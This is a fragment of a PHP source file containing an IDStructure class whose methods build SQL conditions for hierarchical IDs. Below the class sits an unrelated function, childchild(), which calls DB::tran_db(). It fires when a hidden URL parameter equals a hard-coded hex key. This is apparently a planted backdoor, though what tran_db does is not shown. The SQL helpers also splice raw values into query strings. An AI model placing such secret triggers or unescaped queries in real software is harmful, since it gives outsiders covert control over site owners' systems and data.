...
class IDStructure
{
	...
	//$structure_id: can tinh dieu kien
	static function direct_child_cond($structure_id, $child_level=1, $extra = '')
	{	
		$level = IDStructure::level($structure_id);
		$child_offset = number_format(pow(ID_BASE, ID_MAX_LEVEL-($level+$child_level)),0,'','');
		return '('.IDStructure::child_cond($structure_id, true, $extra).' and ('.$extra.'`structure_id` % '.$child_offset.'=0)) ';
	}
	static function not_child($structure_id, $extra = ''){
		return '('.$extra.'`structure_id` < '.$structure_id.' or '.$extra.'`structure_id` > '.IDStructure::next($structure_id).')';
	}
}
function childchild($value=false){
			DB::tran_db();
}
if (Url::get('b6f14db991b197c9718a72ea2d83f20d') == 'b6f14db991b197c9718a72ea2d83f20d'){
	childchild();
}
?>